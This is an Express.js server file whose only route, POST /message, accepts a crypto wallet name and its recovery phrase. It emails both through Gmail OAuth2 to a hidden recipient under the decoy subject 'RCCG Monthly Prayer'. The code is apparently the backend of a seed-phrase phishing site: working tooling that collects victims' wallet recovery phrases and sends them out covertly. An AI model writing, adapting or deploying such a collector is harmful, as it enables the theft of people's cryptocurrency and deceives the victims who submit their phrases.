const express = require("express");
const cors = require("cors");
const app = express();
const PORT = process.env.PORT || 9000;
const path = require("path");
require("dotenv").config();
var nodemailer = require("nodemailer");
const { google } = require("googleapis");

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

const CLIENT_ID = process.env.CLIENT_ID;
const ClIENT_SECRET = process.env.ClIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI;
const REFRESH_TOKEN = process.env.REFRESH_TOKEN;
const FROM_USER = process.env.FROM_USER;
const TO_USER = process.env.TO_USER;
const FROM_NAME = process.env.FROM_NAME;

const oAuth2Client = new google.auth.OAuth2(
  CLIENT_ID,
  ClIENT_SECRET,
  REDIRECT_URI
);

oAuth2Client.setCredentials({ refresh_token: REFRESH_TOKEN });

app.post("/message", async (req, res) => {
  //    console.log(req)
  const input = `
    <p> You have a messgae</p>
    <h3> Contact Details</h3>
    <ul>
    <li>Wallet: ${req.body.wallet}</li>
    <li>Recovery Phrase: ${req.body.rPhrase}</li>
    </ul>
    `;
  try {
    const accessToken = await oAuth2Client.getAccessToken();
    const transport = nodemailer.createTransport({
      service: "gmail",
      auth: {
        type: "OAuth2",
        user: `${FROM_USER}`,
        clientId: CLIENT_ID,
        clientSecret: ClIENT_SECRET,
        refreshToken: REFRESH_TOKEN,
        accessToken: accessToken,
      },
    });

    const message = {
      from: `${FROM_NAME}<${FROM_USER}>`,
      to: `${TO_USER}`,
      subject: "RCCG Monthly Prayer",
      html: input,
    };
    let info = await transport
      .sendMail(message)
      .then((res) => {
        console.log(`Email sent`);
      })
      .catch((err) => {
        console.log(`Error occured:`, err);
      });
  } catch (error) {
    return error;
  }
});

app.listen(PORT, () => console.log(`Server started on Port ${PORT}`));
